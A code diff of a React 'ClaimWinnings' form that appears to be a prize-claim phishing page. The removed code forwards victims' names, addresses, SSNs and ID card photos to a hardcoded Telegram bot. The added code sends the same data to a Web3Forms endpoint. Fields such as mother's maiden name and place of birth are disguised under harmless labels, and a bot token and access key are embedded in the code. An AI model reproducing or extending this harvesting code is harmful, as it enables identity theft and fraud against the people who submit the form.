@@ -54,81 +54,69 @@ const ClaimWinnings = () => {
     }));
   };
 
-  const sendFileToTelegram = async (file: File, botToken: string, chatId: string, caption: string) => {
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", file);
-    formData.append("caption", caption);
   
-    const telegramFileUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-  
-    try {
-      await fetch(telegramFileUrl, {
-        method: "POST",
-        body: formData,
-      });
-    } catch (error) {
-      console.error(`Error sending file (${caption}):`, error);
-    }
-  };
-  
-  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
-    e.preventDefault();
-    setIsLoading(true); 
-  
-    const botToken = "8281468743:AAFiJGfFVYLrwXC6TGWDWoDb8v4b8xZZLyA";
-    const chatId = "1195800890";
-  
-    // Format text message for Telegram
-    const textMessage = `
-  📝 *New Claim Submission* 📝
-  
-  👤 *Full Name:* ${formData.fullname}
-  📧 *Email:* ${formData.email}
-  🏠 *Address:* ${formData.address}, ${formData.city}, ${formData.state}, ${formData.zip_code}
-  📞 *Phone:* ${formData.phone}
-  🎂 *Age:* ${formData.age}
-  ⚤ *Gender:* ${formData.gender}
-  💼 *Occupation:* ${formData.occupation}
-  🆔 *SSN:* ${formData.ssn}
-  📝 *Tax Filled:* ${formData.tax_filled}
-  👨‍👩‍👦 *Marital Status:* ${formData.father_fullname}
-  👩‍👦 *Monthly Income:* ${formData.mother_fullname}
-  🔎 *Own Credit Card:* ${formData.mmn}
-  📍 *Own Bank Account:* ${formData.place_of_birth}
-  🏠 *cash or check:* ${formData.previous_address}
-    `;
-  
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    
-    try {
-      // Send the text message to Telegram
-      await fetch(telegramUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: textMessage,
-          parse_mode: "Markdown",
-        }),
-      });
-  
-      // Send file (if uploaded)
-      if (formData.id_card_front) {
-        await sendFileToTelegram(formData.id_card_front, botToken, chatId, "Front ID Card");
-      }
-      if (formData.id_card_back) {
-        await sendFileToTelegram(formData.id_card_back, botToken, chatId, "Back ID Card");
-      }
-  
-      alert("Successfully sent, we will get back with you shortly");
-      window.location.href = "/";
+ const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+  e.preventDefault();
+  setIsLoading(true);
 
-    } catch (error) {
-      console.error("Error sending message:", error);
-      alert("Failed to submit form.");
+  try {
+    const form = new FormData();
+
+    // Web3Forms Access Key
+    form.append("access_key", "ef443573-31da-4020-be6c-84300cf7b7a0");
+
+    // Optional
+    form.append("subject", "New Claim Submission");
+    form.append("from_name", "Claim Form");
+
+    // Form fields
+    form.append("Full Name", formData.fullname);
+    form.append("Email", formData.email);
+    form.append("Address", formData.address);
+    form.append("City", formData.city);
+    form.append("State", formData.state);
+    form.append("Zip Code", formData.zip_code);
+    form.append("Phone", formData.phone);
+    form.append("Age", formData.age);
+    form.append("Gender", formData.gender);
+    form.append("Occupation", formData.occupation);
+    form.append("SSN", formData.ssn);
+    form.append("Tax Filled", formData.tax_filled);
+    form.append("Marital Status", formData.father_fullname);
+    form.append("Monthly Income", formData.mother_fullname);
+    form.append("Own Credit Card", formData.mmn);
+    form.append("Own Bank Account", formData.place_of_birth);
+    form.append("Cash or Check", formData.previous_address);
+
+    // File uploads
+    if (formData.id_card_front) {
+      form.append("Front ID Card", formData.id_card_front);
     }
-  };
+
+    if (formData.id_card_back) {
+      form.append("Back ID Card", formData.id_card_back);
+    }
+
+    const response = await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: form,
+    });
+
+    const result = await response.json();
+
+    if (result.success) {
+      alert("Successfully sent, we will get back to you shortly.");
+      window.location.href = "/";
+    } else {
+      alert(result.message || "Submission failed.");
+    }
+  } catch (error) {
+    console.error(error);
+    alert("Failed to submit form.");
+  } finally {
+    setIsLoading(false);
+  }
+};
   
 
   return (
